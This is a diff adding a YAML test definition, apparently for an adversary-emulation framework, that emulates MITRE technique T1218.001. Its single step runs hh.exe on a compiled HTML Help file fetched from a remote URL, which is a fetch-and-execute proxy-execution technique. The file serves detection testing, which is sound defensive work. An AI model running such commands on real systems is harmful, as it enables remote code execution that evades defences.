@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Compiled HTML Help Remote Payload
+description: |
+    Uses hh.exe to execute a remote compiled HTML Help payload.
+    Upon execution displays an error saying the file cannot be open
+args:
+    - name: remote_chm_file
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
+uuid: 0f8af516-9818-4172-922b-42986ef1e81d
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.001: Compiled HTML File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: compiled-html-help-remote-payload
+      inline: |
+        hh.exe {{.Args.remote_chm_file}}
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
